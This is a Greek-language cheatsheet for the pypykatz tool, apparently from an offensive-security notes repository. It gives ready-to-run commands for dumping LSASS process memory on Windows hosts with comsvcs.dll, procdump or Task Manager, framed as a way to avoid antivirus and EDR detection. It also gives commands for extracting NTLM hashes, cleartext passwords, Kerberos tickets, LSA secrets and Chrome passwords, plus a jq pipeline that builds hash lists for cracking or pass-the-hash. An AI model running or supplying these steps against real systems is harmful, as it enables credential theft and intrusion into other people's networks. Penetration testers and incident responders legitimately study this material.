<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# pypykatz Cheatsheet

Το [pypykatz](https://github.com/skelsec/pypykatz) είναι μια καθαρή εφαρμογή Python του [Mimikatz](https://github.com/gentilkiwi/mimikatz). Επιτρέπει στους ελεγκτές διείσδυσης και τους ανταποκριτές συμβάντων να αναλύουν τις ενδείξεις μνήμης LSASS των Windows, τις κυψέλες μητρώου SAM/SYSTEM/SECURITY, τα κλειδιά DPAPI και τα εισιτήρια Kerberos εντελώς εκτός σύνδεσης σε Linux και macOS χωρίς να ενεργοποιούν πράκτορες Windows Defender, εντοπισμού και απόκρισης τελικού σημείου (EDR) ή να χρειάζονται ζωντανή πρόσβαση κεντρικού υπολογιστή Windows.

---

## Πίνακας περιεχομένων

- [Επισκόπηση και λειτουργική ασφάλεια (OpSec)](#overview--operational-security-opsec)
- [Εγκατάσταση](#installation)
- [Εκτός σύνδεσης LSASS Dump Parsing (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [SAM & SYSTEM Hive Extraction (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [LSA Secrets Extraction (`registry security`)](#lsa-secrets-extraction-registry-security)
- [Κύρια κλειδιά DPAPI & ανάλυση διαπιστευτηρίων](#dpapi-master-keys--credential-parsing)
- [JSON Export & Automated Credential Pipelines](#json-export--automated-credential-pipelines)
- [Techniques to Safely Dump LSASS on Windows] (#techniques-to-safely-dump-lsass-on-windows)

---

## Επισκόπηση και λειτουργική ασφάλεια (OpSec)

Η εκτέλεση του τυπικού `mimikatz.exe` σε ένα μηχάνημα με Windows-στόχο συχνά ενεργοποιεί αισθητήρες συμπεριφοράς και στατικές υπογραφές. Το `pypykatz` διαχωρίζει τη φάση ντάμπινγκ από τη φάση ανάλυσης:
1. Αποθέστε τη μνήμη διεργασίας LSASS χρησιμοποιώντας εγγενή εργαλεία ή εργαλεία LOLBAS (Διαχείριση εργασιών, `procdump`, `rundll32.exe` ή `comsvcs.dll`).
2. Εξαγάγετε το αρχείο `.dmp` στο σύστημα ανάλυσης Linux.
3. Αναλύστε τα διαπιστευτήρια εντελώς εκτός σύνδεσης με το `pypykatz` με μηδενικό κίνδυνο AV.

---

## Εγκατάσταση
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## Ανάλυση αποτύπωσης LSASS εκτός σύνδεσης (`lsa minidump`)

Αναλύστε τις αποθήκες μνήμης που δημιουργούνται από το `lsass.exe` για να ανακτήσετε κωδικούς πρόσβασης καθαρού κειμένου, κατακερματισμούς NTLM, κατακερματισμούς SHA1, εισιτήρια Kerberos (TGT/TGS) και κλειδιά κρυπτογράφησης AES:

### 1. Βασική ανάλυση Minidump
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
Η έξοδος εξάγει διαπιστευτήρια χωρισμένα από παρόχους ασφαλείας:
- **msv1_0:** Ονόματα χρήστη, τομείς, κατακερματισμοί NTLM και κατακερματισμοί LM.
- **wdigest:** Κωδικοί πρόσβασης Cleartext (εάν είναι ενεργοποιημένη η προσωρινή αποθήκευση του WDigest).
- **kerberos:** Συνεδρίες εισιτηρίων Kerberos και κλειδιά AES.
- **ssp:** Διαπιστευτήρια παρόχου υποστήριξης ασφαλείας.
- **livessp:** Διαπιστευτήρια λογαριασμού Microsoft.
- **cloudap:** Azure AD Primary Refresh Tokens (PRT) και κλειδιά περιόδου λειτουργίας.

### 2. Ανάλυση πολλαπλής μνήμης Dumps αναδρομικά
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## SAM & SYSTEM Hive Extraction (`registry sam`)

Εξαγάγετε ονόματα χρήστη τοπικών λογαριασμών, RID και κατακερματισμούς κωδικών πρόσβασης NTLM από αντίγραφα κυψέλης μητρώου των Windows εκτός σύνδεσης:
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Παραγωγή:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## LSA Secrets Extraction (`registry security`)

Ανακτήστε μυστικά LSA, κωδικούς πρόσβασης λογαριασμού μηχανήματος, προεπιλεγμένους κωδικούς πρόσβασης τομέα και κλειδιά καθαρού κειμένου λογαριασμού υπηρεσίας από τις κυψέλες `SECURITY` και `SYSTEM`:
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
Τα εξαγόμενα μυστικά περιλαμβάνουν:
- `_SC_DefaultPassword`: Διαπιστευτήρια Autologon.
- `$MACHINE.ACC`: Κατακερματισμοί NTLM λογαριασμού υπολογιστή τομέα.
- Αποθηκευμένα διαπιστευτήρια τομέα (DCC2 / mscache2).

---

## Κύρια κλειδιά DPAPI & ανάλυση διαπιστευτηρίων

Το API προστασίας δεδομένων (DPAPI) κρυπτογραφεί τους κωδικούς πρόσβασης του Chrome, τα κλειδιά Wi-Fi και τα διαπιστευτήρια RDP:

### 1. Εξαγάγετε τα κύρια κλειδιά DPAPI από το Registry & SYSTEM
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. Αποκρυπτογραφήστε τους αποθηκευμένους κωδικούς πρόσβασης στο Chrome
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## JSON Export & Automated Credential Pipelines

Εξαγωγή αναλυμένων διαπιστευτηρίων απευθείας στο JSON για άμεση απορρόφηση σε Hashcat, BloodHound ή CrackMapExec:
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
Εξάγετε καθαρούς κατακερματισμούς NTLM χρησιμοποιώντας `jq` για άμεσο σπάσιμο κατακερματισμού ή μετάδοση κατακερματισμού:
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## Τεχνικές για την ασφαλή απόρριψη του LSASS στα Windows

Για να τροφοδοτήσετε τη μνήμη στο `pypykatz`, δημιουργήστε ένα minidump LSASS στον κεντρικό υπολογιστή προορισμού χρησιμοποιώντας εγγενή στοιχεία:

### 1. Εγγενές LOLBAS μέσω `comsvcs.dll` (Διαχειριστής PowerShell)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. Γραφικό περιβάλλον εργασίας διαχείρισης εργασιών
1. Ανοίξτε τη Διαχείριση εργασιών ως διαχειριστής.
2. Στην περιοχή **Λεπτομέρειες**, κάντε δεξί κλικ στο `lsass.exe`.
3. Κάντε κλικ στην **Δημιουργία αρχείου ένδειξης σφαλμάτων** (αποθηκευμένο στο `%TEMP%\lsass.DMP`).

### 3. Sysinternals `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*Μόλις γίνει λήψη στον υπολογιστή σας Linux, εκτελέστε το `pypykatz lsa minidump lsass.dmp`.*